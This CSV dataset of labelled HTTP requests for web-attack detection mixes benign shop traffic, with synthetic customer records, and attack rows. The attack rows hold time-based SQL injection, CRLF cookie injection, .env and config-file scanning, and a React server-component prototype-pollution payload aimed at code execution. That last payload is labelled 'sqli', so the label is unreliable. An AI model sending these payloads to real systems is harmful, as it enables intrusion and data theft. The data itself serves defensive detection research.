text_input,method,url_path,query_params,request_payload,user_agent,response_status,label,attack_type,source
POST /tienda1/publico/pagar.jsp [SEP]  modo=insertar&precio=6987%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=5DF76768D27E4E58F67AB0A56A207C0B localhost:8080  ,POST,/tienda1/publico/pagar.jsp,,modo=insertar&precio=6987%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,sqli,csic2010
GET //proxyjudge.us/azenv.php [SEP]   [SEP] Go-http-client/1.1 [SEP]     ,GET,//proxyjudge.us/azenv.php,,,Go-http-client/1.1,404,1,scanning,loki_exp1
POST /tienda1/publico/caracteristicas.jsp [SEP]  idA=2 [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=6C16991CF040EF6DE3D102366ACAF33B localhost:8080  ,POST,/tienda1/publico/caracteristicas.jsp,,idA=2,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /django/settings.py [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/django/settings.py,,,curl/8.7.1,404,1,scanning,loki_exp1
POST /tienda1/publico/entrar.jsp [SEP]  errorMsg=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=7A1D894D53AD93E1A6DCB2B55F32405B localhost:8080  ,POST,/tienda1/publico/entrar.jsp,,errorMsg=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,sqli,csic2010
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=joyan&password=hojaldrista&nombre=Mathius&apellidos=Narvate&email=pupinyo%40multaspendientes.ve&dni=08466616V&direccion=Aaiun%2C+122+12%3FF&ciudad=Andosilla&cp=17800&provincia=Le%F3n&ntc=8860654392526309&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=0A4BEB45F1D57748202247AA5391FFC6 localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=joyan&password=hojaldrista&nombre=Mathius&apellidos=Narvate&email=pupinyo%40multaspendientes.ve&dni=08466616V&direccion=Aaiun%2C+122+12%3FF&ciudad=Andosilla&cp=17800&provincia=Le%F3n&ntc=8860654392526309&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/productos.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=D836EF44A9E594270C8EB30E59DF5EBA localhost:8080  ,GET,/tienda1/publico/productos.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/autenticar.jsp [SEP]  modo=entrar&login=ness&pwd=juma&remember=on%2F&B1=Entrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=A61290154F45A99511A6B75ACE63FB9B localhost:8080  ,POST,/tienda1/publico/autenticar.jsp,,modo=entrar&login=ness&pwd=juma&remember=on%2F&B1=Entrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/imagenes/3.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=1E5748EE7BF43B0053E1B6850B2CE4E0 localhost:8080  ,GET,/tienda1/imagenes/3.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/2.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=AC3BAFD4B0910E9C00199347FF866869 localhost:8080  ,GET,/tienda1/imagenes/2.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /back-api/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/back-api/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/publico/vaciar.jsp [SEP] B2A=Vaciar+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=24ED70B8E86F5FDF6B7D090A5F83590B localhost:8080  ,GET,/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/miembros/imagenes/ogono.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C6CD05C8E5435694AD9CF860A63D1E56 localhost:8080  ,GET,/tienda1/miembros/imagenes/ogono.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/caracteristicas.jsp [SEP] id=2  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=F7B2FB3B191ADFE1A839BB85FA918958 localhost:8080  ,GET,/tienda1/publico/caracteristicas.jsp,id=2,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/autenticar.jsp [SEP]  modo=entrar&login=kiyohara&pwd=47761an0I59r&remember=off&B1=Entrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=8D76EFAC075AFE5F932D84AEBAA6406B localhost:8080  ,POST,/tienda1/publico/autenticar.jsp,,modo=entrar&login=kiyohara&pwd=47761an0I59r&remember=off&B1=Entrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/imagenes/castro.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=B0BD3233CC62C165B45CA3284987B8F2 localhost:8080  ,GET,/tienda1/miembros/imagenes/castro.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /pageinfo.php [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/pageinfo.php,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /members/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/members/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /IISSamples/sdk/asp/docs/ColorPicker.asp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=9667382391FFEE71E33F671E84D4AA3C localhost:8080  ,GET,/IISSamples/sdk/asp/docs/ColorPicker.asp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/anadir.jsp [SEP]  id=3&nombreA=Jam%F3n+Ib%E9rico&precio=85&cantidad=34&B1=A%F1adir+al+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=BC7123C7D8F089CD104EBA388A31C426 localhost:8080  ,POST,/tienda1/publico/anadir.jsp,,id=3&nombreA=Jam%F3n+Ib%E9rico&precio=85&cantidad=34&B1=A%F1adir+al+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=churas&password=8o4cu6a&nombre=Liber&apellidos=Sanges+Andr%E9u&email=benaderet%40introito.io&dni=27978102M&direccion=Paseo+Virgen+Del+Rocio+160+8%3FD&ciudad=Garganta+de+los+Montes&cpA=50867&provincia=Segovia&ntc=4002449133288786&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=EFC8AF02C2DB83EB739CB3738CC07C7B localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=churas&password=8o4cu6a&nombre=Liber&apellidos=Sanges+Andr%E9u&email=benaderet%40introito.io&dni=27978102M&direccion=Paseo+Virgen+Del+Rocio+160+8%3FD&ciudad=Garganta+de+los+Montes&cpA=50867&provincia=Segovia&ntc=4002449133288786&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/carrito.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=CE870B3DA8FF76D42207B95117BD6B77 localhost:8080  ,GET,/tienda1/publico/carrito.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif.BAK [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=0CA7CC83FE11DACCD12E93ED6DF17B17 localhost:8080  ,GET,/tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif.BAK,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/imagenes/1.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=357CE8BF8BFDF71678083DEFD6461B28 localhost:8080  ,GET,/tienda1/imagenes/1.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/logo.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=58500DD76CB15C6C7DBA9693ED0C783B localhost:8080  ,GET,/tienda1/imagenes/logo.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/2.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=B684C6587030E04A840AB364BBB65859 localhost:8080  ,GET,/tienda1/imagenes/2.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/caracteristicas.jsp [SEP] idA=1  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C6E9FCC36B3F9EBB473BE28187AEFEFC localhost:8080  ,GET,/tienda1/publico/caracteristicas.jsp,idA=1,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/anadir.jsp [SEP]  idA=2&nombre=Vino+Rioja&precio=39&cantidad=23&B1=A%F1adir+al+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=9218AA23784D61437AE9355D884FDB53 localhost:8080  ,POST,/tienda1/publico/anadir.jsp,,idA=2&nombre=Vino+Rioja&precio=39&cantidad=23&B1=A%F1adir+al+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=litherla&password=calisaya&nombre=Eduino&apellidos=Alfonso&email=manez%40lecriture.gn&dni=74835105M&direccion=C%2F+Codigo+Correspondencia+Oficial+Correos-telegrafos+71%2C+10D&ciudad=Santa+Cristina+de+Valmadrigal&cp=34310&provincia=Le%F3n&ntc=7709760846022131&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=85836D242FF102DAC040E6EED782B79A localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=litherla&password=calisaya&nombre=Eduino&apellidos=Alfonso&email=manez%40lecriture.gn&dni=74835105M&direccion=C%2F+Codigo+Correspondencia+Oficial+Correos-telegrafos+71%2C+10D&ciudad=Santa+Cristina+de+Valmadrigal&cp=34310&provincia=Le%F3n&ntc=7709760846022131&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/registro.jsp [SEP] modo=registro&login=adornato&password=politiquer%EDa&nombre=Fedelia&apellidos=%2500&email=pina.diarra%40annoyanc.zm&dni=43658270S&direccion=C%2F+Guincho%2C+191%2C+7%3FF&ciudad=Abezames&cp=12230&provincia=La+Rioja&ntc=4001707460771803&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=7FCDF00320349A56F02888B064109DF1 localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=registro&login=adornato&password=politiquer%EDa&nombre=Fedelia&apellidos=%2500&email=pina.diarra%40annoyanc.zm&dni=43658270S&direccion=C%2F+Guincho%2C+191%2C+7%3FF&ciudad=Abezames&cp=12230&provincia=La+Rioja&ntc=4001707460771803&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=blaylock&password=an%F3Nimamente&nombre=Nav%EDa&apellidos=Llanderal+Campos&email=alvin%40arroyo-molinos.sl&dni=86613661P&direccion=Torres+Altas%2C+162+&ciudad=Campillo+de+Llerena&cp=29640&provincia=Barcelona&ntc=0353282720195441&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=B7ACFBD83B58BEEEE5E67969D1C8C4E9 localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=blaylock&password=an%F3Nimamente&nombre=Nav%EDa&apellidos=Llanderal+Campos&email=alvin%40arroyo-molinos.sl&dni=86613661P&direccion=Torres+Altas%2C+162+&ciudad=Campillo+de+Llerena&cp=29640&provincia=Barcelona&ntc=0353282720195441&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/vaciar.jsp [SEP]  B2A=Vaciar+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=91565E51D30FB81F0295287C92FD2666 localhost:8080  ,POST,/tienda1/publico/vaciar.jsp,,B2A=Vaciar+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/global/titulo.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C75987B07FEF934E3D3D548849C56BD5 localhost:8080  ,GET,/tienda1/global/titulo.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=rickie&password=techumbre&nombre=Yazm%EDn&apellidos=Aul%ED&email=wilton7%40weat.ic&dni=86273903Y&direccion=Calle+Teniente+Bragado+139+7%3FE&ciudad=Sant+Juli%E0+del+Llor+i+Bonmat%ED&cp=43426&provincia=Guadalajara&ntc=3817112988880158&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=BB22899FE3DB1DD61BB659CEBA74114F localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=rickie&password=techumbre&nombre=Yazm%EDn&apellidos=Aul%ED&email=wilton7%40weat.ic&dni=86273903Y&direccion=Calle+Teniente+Bragado+139+7%3FE&ciudad=Sant+Juli%E0+del+Llor+i+Bonmat%ED&cp=43426&provincia=Guadalajara&ntc=3817112988880158&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/miembros.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=92322217E4641210D5560051F8AB1791 localhost:8080  ,GET,/tienda1/publico/miembros.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/pagar.jsp [SEP]  modo=insertar&precio=8547&B1=Pasar+por+caja [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=37AC9D3FA87992F7234DFD16CC53A225 localhost:8080  ,POST,/tienda1/publico/pagar.jsp,,modo=insertar&precio=8547&B1=Pasar+por+caja,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/pagar.jsp [SEP] modo=insertar&precio=8496&B1=Pasar+por+caja%22+AND+%221%22%3D%221  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=F2267085C68E616C5B09AA1460B5FEFE localhost:8080  ,GET,/tienda1/publico/pagar.jsp,modo=insertar&precio=8496&B1=Pasar+por+caja%22+AND+%221%22%3D%221,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET ///public/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,///public/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=zaloker&password=bril%3Fl7du4a&nombre=Alor&apellidos=Massaguer+Molin%E9&email=craig%40youtubeanunciox.gf&dni=65658514T&direccion=Calle+Vascongadas+83%2C+&ciudad=Torreblacos&cp=17489&provincia=Cantabria&ntc=4381135407580429&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=40A281EA2367A5360A53E164513B17DD localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=zaloker&password=bril%3Fl7du4a&nombre=Alor&apellidos=Massaguer+Molin%E9&email=craig%40youtubeanunciox.gf&dni=65658514T&direccion=Calle+Vascongadas+83%2C+&ciudad=Torreblacos&cp=17489&provincia=Cantabria&ntc=4381135407580429&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /_react/data/* [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/_react/data/*,,,curl/8.7.1,404,1,scanning,loki_exp1
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=beomsahn&password=voseo&nombre=Andr%F3cies&apellidos=Pistan+Robredo&email=milionario.kirkham%40programa-gestion-erp.mil&dni=71542361X&direccion=Plza.+Pedagogo+Pestalozzi%2C+157%2C+6%3FD&ciudad=Fresno+de+Torote&cp=10650&provincia=Zaragoza&ntc=7689420873127697&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=ABF97AE80DC1B5A228EF0BC135F36C9D localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=beomsahn&password=voseo&nombre=Andr%F3cies&apellidos=Pistan+Robredo&email=milionario.kirkham%40programa-gestion-erp.mil&dni=71542361X&direccion=Plza.+Pedagogo+Pestalozzi%2C+157%2C+6%3FD&ciudad=Fresno+de+Torote&cp=10650&provincia=Zaragoza&ntc=7689420873127697&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/autenticar.jsp [SEP] modo=entrar&loginA=washburn&pwd=2e822ad4r8&remember=on&B1=Entrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=BF598BDEBDFAC55451E74501B2563DFF localhost:8080  ,GET,/tienda1/publico/autenticar.jsp,modo=entrar&loginA=washburn&pwd=2e822ad4r8&remember=on&B1=Entrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/registro.jsp [SEP] modo=registro&login=semenz%2Bat&password=marido&nombre=Aldo&apellidos=Vera&email=venohr%40devuelos.pg&dni=00726665A&direccion=C%2F+Villarrubia+De+Los+Ojos%2C+13%2C+&ciudad=Pancrudo&cp=12470&provincia=Pontevedra&ntc=0784896124475437&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=BD2F0E06B83A749EA4C77D7712E0B2A9 localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=registro&login=semenz%2Bat&password=marido&nombre=Aldo&apellidos=Vera&email=venohr%40devuelos.pg&dni=00726665A&direccion=C%2F+Villarrubia+De+Los+Ojos%2C+13%2C+&ciudad=Pancrudo&cp=12470&provincia=Pontevedra&ntc=0784896124475437&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
"POST / [SEP]  ------WebKitFormBoundaryx202918375873
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 155824+true+1302228;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx202918375873
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx202918375873
------WebKitFormBoundaryx202918375873-- [SEP] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 [SEP]     ",POST,/,,"------WebKitFormBoundaryx202918375873
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 155824+true+1302228;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx202918375873
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx202918375873
------WebKitFormBoundaryx202918375873--","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",405,1,sqli,loki_exp1
GET /tienda1/miembros/index.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=EB2A5EF64A280249CC7D67BA32A7ED71 localhost:8080  ,GET,/tienda1/miembros/index.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=gedeon&password=54r72il031o&nombre=Yuray&apellidos=Montserrat+Pugeo&email=jose_digges%40blanquillos.aq&dni=45447133F&direccionA=Carretera+De+Arcos%2C+174+&ciudad=Aldeavieja+de+Tormes&cp=46890&provincia=Madrid&ntc=2175163155221209&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=F715A074E08DB3676110C0E36BD50709 localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=gedeon&password=54r72il031o&nombre=Yuray&apellidos=Montserrat+Pugeo&email=jose_digges%40blanquillos.aq&dni=45447133F&direccionA=Carretera+De+Arcos%2C+174+&ciudad=Aldeavieja+de+Tormes&cp=46890&provincia=Madrid&ntc=2175163155221209&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/autenticar.jsp [SEP]  modo=entrar&login=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&pwd=vEnEcIANa&remember=off&B1=Entrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=34DA642050C3498413E2425E6393B5C0 localhost:8080  ,POST,/tienda1/publico/autenticar.jsp,,modo=entrar&login=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&pwd=vEnEcIANa&remember=off&B1=Entrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/autenticar.jsp [SEP]  modo=entrar&login=persaud&pwd=cAtAliNeTa&remember=off&B1=Entrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=7E7178F49A642C51C76F339845D6EA21 localhost:8080  ,POST,/tienda1/publico/autenticar.jsp,,modo=entrar&login=persaud&pwd=cAtAliNeTa&remember=off&B1=Entrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
